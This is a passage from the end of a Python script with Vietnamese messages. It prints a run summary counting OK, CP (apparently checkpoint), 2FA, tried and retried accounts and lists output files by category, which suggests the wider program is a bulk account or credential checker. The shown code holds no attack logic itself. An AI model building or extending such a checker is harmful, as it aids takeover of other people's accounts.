            sys.stderr.write(f"[Main] finalize lỗi: {e}\n")

        try:
            await state.save()
        except Exception as e:
            sys.stderr.write(f"[Main] state save lỗi: {e}\n")

        self._print_summary(stats, outputs)
        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            pass

    def _print_summary(self, stats, outputs):
        print()
        print("  " + rainbow_border("═", 58))
        print()
        print(f"  {C.GOLD}{C.B}          ✦ HOÀN TẤT ✦{C.R}")
        print()
        print("  " + rainbow_border("═", 58, palette=RAINBOW2))
        print()
        print(f"  {C.GREEN}{C.B}✓ OK        {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.ok}{C.R}")
        print(f"  {C.GOLD}{C.B}◐ CP        {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.cp}{C.R}")
        print(f"  {C.PINK}{C.B}🔐 2FA      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.twofa}{C.R}")
        print(f"  {C.CRIMSON}{C.B}✗ Net err   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.err}{C.R}")
        print(f"  {C.CRIMSON}{C.B}✗ Out err   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.out_err}{C.R}")
        print(f"  {C.CYAN}{C.B}⚡ Tried     {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.tried}{C.R}")
        print(f"  {C.VIOLET}{C.B}↻ Retries   {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.retry}{C.R}")
        print(f"  {C.VIOLET}{C.B}⏱ Time      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.uptime():.1f}s{C.R}")
        print(f"  {C.SKY}{C.B}◈ Rate      {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{stats.rate():.1f}/s{C.R}")
        print()
        print(f"  {C.GOLD}💾 Output: {C.WHITE}{CONFIG['output_dir']}{C.R}")
        for kind in ("ok", "cp", "2fa"):
            path = outputs.files.get(kind, {}).get("txt")
            if path and path.exists():
                print(f"     {C.GRAY}• {kind}: {path.name}{C.R}")
        print()
        print("  " + rainbow_border("✦", 58))
        print()


def main():
    try:
        ZinApp().main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}⏹ Đã dừng bởi người dùng{C.R}\n")
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n  {C.RED}✗ Lỗi không mong đợi: "
                         f"{type(e).__name__}: {e}{C.R}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()